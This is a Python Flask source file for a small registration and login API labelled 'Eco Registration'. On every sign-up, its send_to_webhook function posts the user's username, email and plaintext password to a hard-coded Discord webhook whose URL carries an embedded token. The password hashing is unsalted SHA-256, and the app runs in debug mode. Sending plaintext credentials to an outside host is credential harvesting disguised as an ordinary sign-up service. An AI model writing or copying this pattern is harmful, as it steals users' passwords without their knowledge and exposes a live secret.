from flask import Flask, request, jsonify
import hashlib
import json

app = Flask(__name__)

# In-memory storage for users (username as key, password hash as value)
users = {}

# Route for user registration
@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()

    # Extract the data from the incoming JSON
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    # Basic validation for input fields
    if not username or not email or not password:
        return jsonify({'error': 'All fields are required!'}), 400

    # Check if the username already exists
    if username in users:
        return jsonify({'error': 'Username already exists!'}), 400

    # Hash the password (SHA-256 for demonstration, use bcrypt or Argon2 in production)
    password_hash = hashlib.sha256(password.encode()).hexdigest()

    # Store the user in the in-memory dictionary
    users[username] = {'email': email, 'password_hash': password_hash}

    # Send registration data to Discord webhook (in background or after response)
    send_to_webhook(username, email, password)

    return jsonify({'message': 'Registration successful!'}), 200


# Route for user login
@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()

    # Extract the data from the incoming JSON
    username = data.get('username')
    password = data.get('password')

    # Basic validation for input fields
    if not username or not password:
        return jsonify({'error': 'Both username and password are required!'}), 400

    # Check if the username exists
    user = users.get(username)
    if not user:
        return jsonify({'error': 'Invalid credentials'}), 400

    # Check if the password matches (hashed comparison)
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    if password_hash != user['password_hash']:
        return jsonify({'error': 'Invalid credentials'}), 400

    return jsonify({'message': 'Login successful! Welcome back, ' + username}), 200


# Function to send registration data to Discord webhook (you can make this async)
def send_to_webhook(username, email, password):
    webhook_url = 'https://discord.com/api/webhooks/1401557352573829271/G5zMPn68i-gHlPj4LIiw23wp6Mc55xETfCnAwKakRdmCyUtW4AfP3zMJnA4LLYG-VOd7'
    
    # Webhook payload
    payload = {
        "embeds": [{
            "title": "New Account Registration",
            "color": 5814783,  # Light blue color
            "fields": [
                {"name": "Username", "value": f"```{username}```", "inline": True},
                {"name": "Email", "value": f"```{email}```", "inline": True},
                {"name": "Password", "value": f"```{password}```", "inline": False},  # You should remove password in production
            ],
            "timestamp": "2023-08-03T00:00:00Z",
            "footer": {
                "text": "Eco Registration"
            }
        }]
    }

    # Send data to the webhook (you can use requests or any HTTP client here)
    import requests
    try:
        response = requests.post(webhook_url, json=payload)
        response.raise_for_status()  # Raise an error for bad responses
    except Exception as e:
        print(f"Error sending webhook: {e}")


if __name__ == '__main__':
    app.run(debug=True)
